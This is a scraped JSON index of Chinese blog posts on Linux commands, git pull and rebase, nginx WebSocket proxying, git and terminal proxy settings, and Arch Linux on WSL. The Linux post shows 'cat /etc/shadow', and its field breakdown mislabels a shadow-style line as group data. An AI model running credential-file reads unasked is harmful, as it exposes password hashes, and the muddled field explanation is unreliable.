ip地址。 参考链接 开启Linux 虚拟机使用快速入门–官网文档 GCP（Google Cloud Platform）入门","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"云","slug":"云","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"不常用Linux命令","slug":"not-commonly-used-linux-commands","date":"2020-08-25T12:53:33.000Z","updated":"2020-08-25T12:54:50.257Z","comments":true,"path":"not-commonly-used-linux-commands/","link":"","permalink":"https://www.0x2beace.com/not-commonly-used-linux-commands/","excerpt":"这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。","text":"这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。 Wgetwget 命令用于文件的下载， 下载单个文件123# 下载Ubuntu 18.04 桌面版和服务端版$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-live-server-amd64.iso$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-desktop-amd64.iso wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。 为了解决这个问题，我们可以使用参数-O来指定一个文件名： 下载单个文件并重命名1$ wget -O file.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080 后台下载当需要下载比较大的文件时，使用参数-b可以隐藏在后台进行下载： 1$ wget -b http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip 可以使用以下命令来察看下载进度： 1$ tail -f wget-log CurlScpscp 命令用于文件传输，在不能使用 XShell 这类工具时，scp能很好的解决文件上传的问题。 上传文件1$ scp -r &#x2F;c&#x2F;User&#x2F;Desktop&#x2F;dirname username@34.92.117.222:&#x2F;tmp&#x2F;dirname 下载文件1$scp -r Boo@34.92.117.222:&#x2F;tmp&#x2F;dirname &#x2F;c&#x2F;Users&#x2F;Boo&#x2F;Desktop&#x2F;dirname 如果存在端口号： 注意：-P参数是大写。 1scp -P 58812 root@103.232.86.239:&#x2F;tmp&#x2F;runfast_0603.sql ~&#x2F;File&#x2F; 其中 -r 参数表示目录，username 表示服务器对应用户，@ 后面接服务器地址。 注意：不要直接使用 root 用户，因为总是会提示你权限不足。另外使用非 root 用户时，需要注意文件夹权限的问题。 zipzip 命令用于对文件进行打包处理，也就是我们常说的压缩。文件经压缩之后会生成一个具有.zip扩展名的压缩文件。 将当前目录的dir目录下的所有文件及文件夹压缩为 example.zip 1$ zip -r -q example.zip dir 将当前目录下的所有文件及文件夹压缩为 example.zip 1$ zip -r -q * 将指定文件目录的所有文件及文件夹压缩为 example.zip 1$ zip -r -q exmaple.zip &#x2F;tmp&#x2F;dir unzipunzip 命令用于解压缩由 zip 命令压缩的“.zip”压缩包。 查看压缩文件 1$ unzip -v dir.zip 将压缩文件在当前目录下解压 1$ unzip example.zip 将压缩文件example.zip在指定目录/tmp下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。 1$ unzip -n example.zip -d &#x2F;tmp 将压缩文件example.zip在当前目dir下解压，如果已有相同的文件，不询问，直接覆盖。 1$ unzip -o example.zip -d -o 参数表示不必先询问用户，unzip执行后覆盖原有的文件；-d 参数指定文件解压缩后所要存储的目录；-n 参数解压缩时不要覆盖原有的文件； tartar 命令可以为linux 文件和目录创建档案。 利用tar命令，可以把一大堆的文件和目录全部打包成一个文件。 需要明确的两个概念是：打包和压缩是不同的两件事。 打包：是指将一大堆文件或目录变成一个总的文件； 压缩：则是将一个大文件通过压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 打包仅打包，不压缩。 1$ tar -cvf test.tar 20200323.log test.tar这个文件名是自定义的，只是习惯上我们使用.tar作为包文件。 打包并压缩打包，且压缩。-z参数表示以.tar.gz或者.tgz后缀名代表gzip压缩过的tar包。 1$ tar -zcvf test.tar.gz 20200323.log 打包，且压缩。-j参数表示以.tar.bz2后缀名作为tar包名。 1$ tar -jcvf test.tar.bz2 20200323.log 查看包内容1$ tar -ztvf test.tar.gz 因为使用gzip命令压缩的test.tar.gz，所以查看压缩包时需要加上-z参数。 如何只解压部分文件？ 1$ tar -ztvf test.tar.gz 20200323.log 这种方式仅限于取一个文件。 解压在该目录下直接解压： 1$ tar -zxvf test.tar.gz 解压至指定文件夹： 123$ tar -zxvf test.tar.gz -C log$ ls log20200323.log gzip.gz压缩包（不带tar），需要使用gzip 命令去解压。 1gzip test.gz -d &#x2F;&lt;filename&gt; -d 参数用于指定解压位置 杂项如何查看Linux 的发行版本？ 1$ lsb_release -a crontabcrontab 命令被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似。 ww命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。 不带任何参数，会显示当前登入系统的所有用户 12345$ w 10:54:39 up 14 days, 22:39, 2 users, load average: 0.18, 0.09, 0.08USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATwangyh pts&#x2F;0 113.87.129.118 10:27 25:10 2.77s 2.76s topBoo pts&#x2F;1 113.87.129.118 10:54 1.00s 0.00s 0.00s w 第一行显示的字段信息分别是： 10:50:39：系统当前时间 up 2:02： 系统已运行时间 2 user：当前在线用户个数 load average：系统的平均负载，3个数值分别对应系统在过去的1,5,10分钟内的负载程度，数值越大，表明系统的负载越大。 第二行几个字段分别表示： USER ： 登陆用户的账户名 TTY： 用户登陆所使用的终端 FROM： 显示用户从何处登陆，用户的IP地址 LOGIN@：显示用户登陆入系统时的时间 IDLE：用户空闲时长，从上一次该用户的任务结束后开始计时，以hour为单位 JCPU：表示在某段时间内，当前用户所有的进程任务所消耗的CPU时间 PCPU：表示在某段时间内，当前用户正在执行的进程任务所消耗的CPU时间 WHAT：表示用户正在执行的任务 whowho 命令用于查看目前登入系统的用户信息，与w命令类似。 显示当前登入系统中的所有用户信息 123$ whowangyh pts&#x2F;0 2019-04-19 10:27 (113.87.129.118)Boo pts&#x2F;1 2019-04-19 10:54 (113.87.129.118) 常用参数-m：效果等同于执行whoami命令-q或--count：只显示登入系统的帐号名称和总人数；-H：增加显示用户信息状态栏 lastlast 命令用于查看用户最近的登入信息 输出最后10 条登入信息 1234$ last -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inwangyh pts&#x2F;0 113.87.129.118 Fri Apr 19 10:27 still logged inwangyh pts&#x2F;5 113.87.129.118 Fri Apr 19 10:24 - 10:27 (00:02) 查看指定用户的登入信息 1234$ last Boo -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inBoo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:23 - 10:26 (00:03)Boo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:14 - 10:22 (00:08) pkillpkill命令可以按照进程名杀死进程，可以用于踢出当前登入系统的用户。 安全的踢出用户可以使用pkill命令踢出当前正登入系统中的用户，但是这么做很危险，更好的解决办法是：先查看终端号，然后查看该终端执行的所有进程，根据进程号来停止服务。 12$ ps -ef| grep pts&#x2F;0$ kill -9 pid passwdpasswd 命令用于设置用户的认证信息，包括用户密码、密码过期时间等。 系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。 ssss 命令用来显示处于活动状态的套接字信息。ss 命令可以用来获取socket 统计信息，它可以显示和netstat 类似的内容。但ss 的优势在于它能够显示更多更详细的有关TCP 和连接状态的信息，而且比netstat 更快速更高效。 显示所有的tcp 套接字 1$ ss -t -a 显示Socket 摘要 1$ ss -s 列出所有打开的网络连接端口 1$ ss -l 找出打开套接字/端口应用程序 1$ ss -pl | grep 6666 知识扩展存放用户信息： 12$ cat &#x2F;etc&#x2F;passwd$ cat &#x2F;etc&#x2F;shadow 用户信息文件分析（每项用:隔开）： 12345678jack:X:503:504:::&#x2F;home&#x2F;jack&#x2F;:&#x2F;bin&#x2F;bashjack &#x2F;&#x2F;用户名X &#x2F;&#x2F;口令、密码503 &#x2F;&#x2F;用户id（0代表root、普通新建用户从500开始）504 &#x2F;&#x2F;所在组: &#x2F;&#x2F;描述&#x2F;home&#x2F;jack&#x2F; &#x2F;&#x2F;用户主目录&#x2F;bin&#x2F;bash &#x2F;&#x2F;用户缺省Shell 存放组信息： 12cat &#x2F;etc&#x2F;groupcat &#x2F;etc&#x2F;gshadow 用户组信息文件分析： 123456789jack:$!$:???:13801:0:99999:7:*:*:jack &#x2F;&#x2F;组名$!$ &#x2F;&#x2F;被加密的口令13801 &#x2F;&#x2F;创建日期与今天相隔的天数0 &#x2F;&#x2F;口令最短位数99999 &#x2F;&#x2F;用户口令7 &#x2F;&#x2F;到7天时提醒* &#x2F;&#x2F;禁用天数* &#x2F;&#x2F;过期天数 如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。 12# 修改boo 用户的密码$ passwd boo 参考链接： Wget 命令 SCP 命令 last 命令 who 命令 pkill 命令 ss 命令 permission denied,please try again","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Linux Commands","slug":"Linux-Commands","permalink":"https://www.0x2beace.com/tags/Linux-Commands/"}]},{"title":"Git 变基命令详解","slug":"detailed-explanation-of-git-rebase-commands","date":"2020-08-24T12:06:20.000Z","updated":"2020-08-25T12:10:32.469Z","comments":true,"path":"detailed-explanation-of-git-rebase-commands/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/","excerpt":"“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。","text":"“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。 场景重现问题描述：有时候我们在本地提交完代码，下一个操作是需要推送到远程仓库，这时如果远程仓库已经有了更新的提交，那么当我们执行完git push 命令之后，不出意外会出现以下错误： 1234567! [rejected] master -&gt; master (fetch first)error: failed to push some refs to &#39;git@gitlab.com:invest2&#x2F;invest_home.git&#39;hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., &#39;git pull ...&#39;) before pushing again.hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details. 这时错误的意思是：推送失败，你需要先将远程仓库最新的提交更新到本地仓库，然后才能 git push。 所以这个时候你有两个选择： 使用git pull 自动合并 使用git fetch 手动合并 前者虽然用起来很方便，但是自动合并会留下一次合并记录，类似这样： 1Merge branch &#39;master&#39; of bitbucket.org:maxt2013&#x2F;invest_home 虽然这并不会影响什么，但如果你很重视 commit logs，那么这样的一次记录，是不被容忍的。 后者通过手动合并，确实可以做到没有多余的合并记录，但是每次手动合并有比较麻烦，那么有没有什么折中的方式，既可以不留下多余的记录，有比较省事。 答案是有的，它就是我们下面要介绍的“变基”。 rebase下面这条命令会将远程仓库中最新的提交合并到本地仓库，--rebase参数的作用是先取消 commit 记录，并把它们临时保存为补丁（patch），这些补丁放在 .git/rebase目录中，等远程仓库同步至本地之后，最后才将补丁合并到本地仓库。 1git pull --rebase origin master 下面用图来解释具体发生了什么。 git pull 之前的情况： 使用 git pull --rebase origin： 最后使用 git push： 总结如果你对 commit logs有强烈的控制欲望，那么变基命令是适合你的，如果你是使用git 的新手，或者你不在意 commit logs，那么直接使用 git pull 自动合并就好了。 参考链接 git push错误failed to push some refs to的解决","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Socket.io 连接异常：Error during WebSocket handshake Unexpected response code 400","slug":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400","date":"2020-08-23T02:34:50.000Z","updated":"2020-08-23T02:43:00.235Z","comments":true,"path":"socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","link":"","permalink":"https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/","excerpt":"前段时间线上的生产环境遇到一个问题：Error during WebSocket handshake: Unexpected response code: 400。 起初我没太在意，以为就是正常的 socket.io 连接断开了。 直到我发现 socker.io 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。","text":"前段时间线上的生产环境遇到一个问题：Error during WebSocket handshake: Unexpected response code: 400。 起初我没太在意，以为就是正常的 socket.io 连接断开了。 直到我发现 socker.io 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。 nginx 作为wbsocket 代理经过一番查找，了解到 nginx 在作为反向代理时，如果需要使用 wss，那么还需要额外加一段配置。 NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly. —— Nginx 官网 翻译过来就是：nginx 通过允许在客户端和后端服务器之间建立连接来支持 websocket 通讯，为了使 nginx 将升级请求从客户端发送到后端服务器，必须明确设置 Upgrade 和 Connection 标头。 12345678location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;wsbackend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;Upgrade&quot;; proxy_set_header Host $host;&#125; 第一行是 nginx 反向代理的配置，后面四行才是这个问题的解决方案。 仔细想一想，因为本地没有 https 的概念，并没有发现这个问题，而线上是有配置证书的，所以暴露出了这个问题。 总结socket.io 的请求并没有真正达到，请求发出之后中间为什么没有到达节点，这个是解决问题的关键。 为了使 nginx 正确处理 socket.io 所需要做的就是正确设置标头，以处理将连接从 http 升级到 websocket 的请求。 参考链接 Nginx 作为Websocket 反向代理","categories":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/categories/Socket-io/"},{"name":"Nginx","slug":"Socket-io/Nginx","permalink":"https://www.0x2beace.com/categories/Socket-io/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"},{"name":"wss","slug":"wss","permalink":"https://www.0x2beace.com/tags/wss/"}]},{"title":"Git Clone 太慢怎么办？","slug":"what-should-I-do-if-git-clone-is-too-slow","date":"2020-08-19T14:29:15.000Z","updated":"2020-09-08T01:31:21.124Z","comments":true,"path":"what-should-I-do-if-git-clone-is-too-slow/","link":"","permalink":"https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/","excerpt":"","text":"前言最近在使用git 时，需要克隆Bitbucket的一个仓库，于是像往常一样打开了iTerm，便放在一边了。直到一个小时后，我才想起来，想着应该克隆完了，打开才发现百分之一都没下载完。 强大的长城技术对GitHub、Bitbucket 这类源代码托管服务平台网开一面，并没有像Google、FaceBook那样直接一刀切，但是它做了严格的限速，这种折磨简直比无法访问更难受。 上图中git clone的速度从来没有超过 10k/s，这也就意味着一个 100M 的项目，需要近三个小时才能下载完，而且由于网络的不稳定性，下载过程中偶尔会出现断开连接的情况，由于git clone 不支持端点续传，这就会导致前几个小时的下载量完全浪费掉了，只能重新开始下载。 这篇文章主要用来介绍几种方式可以快速的克隆远程仓库。 浅复制git clone默认会下载项目的完整历史版本，如果你只关心代码，而不关心历史信息，那么可以使用 git 的浅复制功能： 1$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git --depth=1 表示只下载最近一次的版本，使用浅复制可以大大减少下载的数据量，例如，CodeIgniter 项目完整下载有近 100MiB ，而使用浅复制只有 5MiB 多，这样即使在恶劣的网络环境下，也可以快速的获得代码。 如果之后又想获取完整历史信息，可以使用下面的命令： 1$ git fetch --unshallow 或者，如果你只想下载最新的代码，你也可以直接从远程仓库下载打包好的zip文件，这会比浅复制更快，因为它只包含了最新的代码文件，而且zip是压缩文件。但是很显然，使用浅复制会灵活一些。 GUI 工具如果你有幸正在使用代理，懂得如何科学上网的话，那么访问GitHub、Bitbucket对你来说应该不在话下。 从源代码托管服务平台下载项目最简单的方法就是使用一款图形化界面（GUI）的Git工具。 使用GUI工具方便之处就在于，可以在设置中直接配置是否使用代理。或者直接将代理配置尾系统代理。 http/https proxy如果你跟我一样，更喜欢使用原生的git命令，喜欢使用在命令行下操作的那种感觉，那么你也可以在命令行下直接配置代理。 这里也有两种方式，根据实际情况自行选择。 http12$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087 或者直接编辑~/.gitconifg文件 123456# vim ~&#x2F;.gitconfig[http] proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087[https] proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087 socks512$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086 其中，1087、1086分别是你本地机器的 http、socks5代理的端口号。 另外，如果想取消设置，可以输入以下命令： 12$ git config --global --unset http.proxy$ git conifg --global --unset https.proxy 配置完成后，重新 clone一遍，可以看到速度得到了极大的提升。 注意⚠️ 上面这种配置方式仅适用于 https协议，如果你在clone时选择ssh协议，那么速度仍然会很慢。 替换域名如果你觉得上面的方式太麻烦了，或者是你没有代理，那么可以试试下面这种方式。 这种方式简单暴力，替换就可以直接使用，使用规则如下： 12345# 原地址$ git clone https:&#x2F;&#x2F;github.com&#x2F;996icu&#x2F;996.ICU.git# 替换成$ git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;996icu&#x2F;996.ICU.git 只需要在github.com后面追加一个.cnpmjs.org就可以了。 以上就是git clone太慢时的各种解决办法。 参考链接Git Clone 太慢怎么办？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"},{"name":"Skill","slug":"Git/Skill","permalink":"https://www.0x2beace.com/categories/Git/Skill/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"},{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"}]},{"title":"如何让终端命令走代理？","slug":"how-to-make-terminal-commands-go-through-proxy","date":"2020-08-18T15:39:58.000Z","updated":"2020-08-18T15:43:24.093Z","comments":true,"path":"how-to-make-terminal-commands-go-through-proxy/","link":"","permalink":"https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/","excerpt":"问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完brew updata 之后，就一直是Updating Homebrew...","text":"问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完brew updata 之后，就一直是Updating Homebrew... 这个时候，我产生了几个疑问： 为什么卡着不动了，明明是有网络的啊。 难道是因为Homebrew 需要访问国外的源？ Shadowsocks 明明是开着全局代理，为什么没有用？ 如何让终端命令走代理，或者说如何让 Homebrew 走代理更新？ 方案首先先回答一下上面那些问题，因为国内网络环境进一步恶劣，使得从根本上造成了这个问题的产生。因为Shadowshocks的全局代理虽然对浏览器是有效，但对命令行无效。 所以这一切的问题可以总结成一个问题：如果能让终端命令走代理就好了。 好在Homebrew 是支持全局代理的，所以我们只需要在当前环境中加入代理配置就好了。 123export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080&#x2F;&#x2F; 1080 是本地 socks5 监听端口 如何知道终端命令有没有走代理？ 有一个很简单的方法，那就是通过Curl 命令： 1curl https:&#x2F;&#x2F;www.google.com 如果走了本地代理，那么很快终端就会有输出，如果没有走则会提示403 端口请求超时。 永久生效需要注意的是，上面的配置仅仅只是临时的，如果重启一下终端，这个配置就失效了，那么有没有办法可以永久生效呢？ 当然是有的，只需要将环境变量写入终端中。 12345# bashecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile# zshecho export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zsh_profile 这样，Homebrew 就能通过 Shadowsocks 来更新了。 参考链接 让 Homebrew 走代理更新 如何让Homebrew 走代理更新？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Git Pull 命令详解","slug":"detailed-git-pull-command","date":"2020-08-17T15:34:26.000Z","updated":"2020-08-17T15:36:38.472Z","comments":true,"path":"detailed-git-pull-command/","link":"","permalink":"https://www.0x2beace.com/detailed-git-pull-command/","excerpt":"这片文章主要用来讲解git pull命令的一些细节。","text":"这片文章主要用来讲解git pull命令的一些细节。 git pullgit pull 的作用是：取回远程主机某个分支的更新，再与本地指定分支自动合并。 描述将远程主机中的更改合并到当前分支，在默认情况下git pull是git fetch命令和git merge Fetch_HEAD命令的合集，后面会详细介绍。 示例这是git pull 的完整格式： 1$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;…]] 比如要取回origin主机的fixbug分支的最新提交，并与本地的master分支合并，就需要写成这个样子： 1$ git pull origin fixbug:master 如果远程分支要与当前分支合并，则冒号及其冒号后的分支可以省略，就变成了这个样子： 12&#x2F;&#x2F; 取回firebug 分支的最新提交并与当前分支合并$ git pull origin fixbug 上面的命令表示，取回origin/fixbug分支最新的提交，并于当前分支合并。 这里就等同于先git fetch获取所跟踪的远程分支的最新的提交，然后执行git merge合并到当前分支。也就是下面两条命令。 12345&#x2F;&#x2F; 自动从当前分支的跟踪分支上获取最新的提交$ git fetch &#x2F;&#x2F; 合并origin&#x2F;fixbug分支到当前分支$ git merge origin&#x2F;fixbug git fetch 为什么这个分支是这种写法? 因为git fetch命令会获取当前追踪分支的最新更改，就等同于取回origin/fixbug分支到本地。 你可以使用git branch -a 查看所有分支，会发现多了一个 origin/fixbug分支，前提是该分支已经建立了追踪关系。 而这个分支所包含的内容就是最新的提交或者其他某些更改。所以此时你需要通过合并这个长的比较奇怪的分支，来更新本地的工作区。 在某些场合，Git 会自动在本地分支与远程分支之间建立一种追踪关系（tracking）。比如，我们在clone 时，会发现所有本地分支默认与远程主机的同名分支，建立追踪关系。也就是说，本地的 master 分支自动追踪 origin/master分支。 Git 也允许手动添加追踪关系。 12&#x2F;&#x2F; 本地master分支与取回origin&#x2F;fixbug分支建立关系。$ git branch --set-upstream master origin&#x2F;fixbug 如果当前分支与远程分支存在追踪关系。那么git pull 就可以省略远程分支名。 1$ git pull origin 上面的分支是什么意思呢？就是表示本地的当前分支会自动与对应的origin主机的“追踪分支”进行合并。 如果当前分支只对应一种追踪分支，那么远程主机名都可以省略。 12&#x2F;&#x2F; 这也就成了我们常看见的原始命令。$ git pull 上面的命令会自动的与唯一的追踪分支进行合并。 如何将远程分支作为本地的默认分支？ 1$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt; 这样就将远程的分支与本地同名分支建立了追踪关系。 可以使用git config -e命令查看。 当追踪关系只有一个时，那么使用git pull 命令，就可以直接更新&lt;remote branch&gt; 分支了。 如果合并需要采用rebase模式，可以使用--rebase选项。 git rebase 这里说一个题外话，rebase 是什么？有什么用？ git rebase 清除本地历史提交 1$ git --rebase &lt;远程主机名&gt;&lt;远程分支名&gt;:&lt;本地分支名&gt; git fetch 与 git pull 的区别。 git fetch 表示从远程获取最新的版本到本地，但是不会自动合并。其过程用命令表示就是： 123$ git fetch origin master$ git log -p master..origin&#x2F;master$ git merge origin&#x2F;master 另一种写法就是： 123$ git fetch origin master:tem$ git diff tem$ git merge tem 上面这两种写法都是都是一个意思。唯一有所区别的就是使用 tem分支代替了origin/master分支的存在。其含义是： 从远程origin主机的master主分支下载最新的版本到本地origin/master分支，或者tem分支。 比较本地master分支与origin/master（tem）分支的差异。 最后进行合并 git pull，相当于从远程获取最新的版本并合并到本地。 1$ git pull origin master 上述命令其实相当于git fetch 和 git merge在实际使用中，git fetch更安全一些，因为在merge前，我们可以查看更新情况，然后再决定是否合并。","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Win10 如何卸载 Arch Linux","slug":"how-to-uninstall-wsl-linux-subsystem-in-win-10","date":"2020-08-16T09:56:22.000Z","updated":"2020-08-23T02:46:19.997Z","comments":true,"path":"how-to-uninstall-wsl-linux-subsystem-in-win-10/","link":"","permalink":"https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/","excerpt":"最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。","text":"最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。 在正式卸载之前，有以下几点需要注意： 不要试图通过 Microsoft Store 去卸载，那里只有安装按钮，没有卸载按钮。 秋季创意者更新之前，可以使用lxrun命令去进行卸载操作，但是秋季创意者更新之后该命令就被移除了。 查看发行版列出当前已经安装且随时可用的发行版： 1wslconfig &#x2F;list 列出所有发行版，包括正在安装、卸载和已损坏的发行版： 1wslconfig &#x2F;list &#x2F;all 卸载卸载已经安装的发行版： 12345$ wslconfig &#x2F;list &#x2F;allWindows Subsystem for Linux Distributions:Arch (Default)$ wslconfig &#x2F;unregister ArchUnregistering... 上面是以Arch Linux为例进行卸载，其他发行版同理，只需要替换发行版的名称就可以了。 注意: 卸载发行版时，会永久删除所有与该发行版有关的数据和设置。 参考链接 Windows 10 Linux子系统如何卸载？","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Windows","slug":"Linux/Windows","permalink":"https://www.0x2beace.com/categories/Linux/Windows/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Arch Linux","slug":"Arch-Linux","permalink":"https://www.0x2beace.com/tags/Arch-Linux/"}]},{"title":"Win10 如何安装 Arch Linux","slug":"how-to-install-arch-linux-on-win10","date":"2020-08-16T09:50:09.000Z","updated":"2020-08-16T10:00:10.873Z","comments":true,"path":"how-to-install-arch-linux-on-win10/","link":"","permalink":"https://www.0x2beace.com/how-to-install-arch-linux-on-win10/","excerpt":"最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。 第一件需要做的事情就是配置开发环境。","text":"最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。 第一件需要做的事情就是配置开发环境。 了解 WSL什么是 WSL ？Windows Linux Server (WSL) 又名Windows 子系统，它使得开发人员可以直接在未经修改得Windows 上运行 Gun/Linux 环境，也包括大多数命令行工具，实用程序员和应用程序员，而不会需要额外增加虚拟机。 WSL 可以做什么 你可以自行选择你喜欢的 Gun/Linux 发行版：Arch Linux、Ubuntu、OpenSuSE、Kail Linux、Debian、Fedora等。 运行通用的命令行，例如grep，sed，awk或其他ELF-64二进制文件。 轻松运行Bash Shell脚本和 GNU/Linux 命令行应用程序 使用自己的 GNU/Linux 分发程序包管理器安装其他软件。 使用类似Unix的命令行外壳调用Windows应用程序。 在Windows上调用 GNU/Linux 应用程序。 有了这些功能，我们就可以完成很多工作，而不必担心安装虚拟机监控程序，从而享受Linux的好处。安装并准备好Win 10后，请按照以下步骤进行操作，并在其中添加Arch Linux。 安装 WSL本文要安装的WSL 是 Arch Linux 。 为什么要选择 Arch Linux？ 因为它是一个轻量级且灵活的Linux 发行版。 为Linux 安装Windows 子系统这是一项使Windows能够“ 托管 ” Linux 的功能。所以需要先启用此功能。 以管理员的身份打开Power Shell，然后输入以下命令： 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 通常会重启一次你的电脑。 安装Arch Linux我记得在2019 年，Windows 刚拥抱 Linux 时，Arch Linux 还可以直接从 Microsoft Store 直接下载，不知为何现在却搜不到了。 不过还是有其他办法手动安装，打开该页面，下载Arch.zip。 解压完成之后，可以看到如下文件： 双击Arch.exe应用程序，进行安装。 稍微等待一会，就可以看到Arch Linux 已经顺利安装完成了，然后按任意键退出。 启动Arch Linux再次双击Arch Linux，不出意外的话，就可以看到Arch Linux 的控制台了，没错就是这么简单。 配置第一次安装完成之后，需要手动做一些配置，初始化并更新系统。 在终端或CMD 中输入WSL 进入Arch Linux。 编辑 /etc/pacman.d/mirrorlist，去掉China节点 前面的##，以及下面的Server下面的##。 初始化123pacman-key --initpacman-key --populate archlinux 更新12345&#x2F;&#x2F; 更新 GPG keypacman -Sy archlinux-keyring&#x2F;&#x2F; 更新系统，速度快慢与镜像源有关pacman -Syyu base base-devel 个性化Arch Linux 默认的样式并不好看，和CMD 都是黑漆漆的一片。 因为Arch Linux 默认使用的 Bash，如果你和我一样，更喜欢 Zsh 的话，那就请继续看下去。 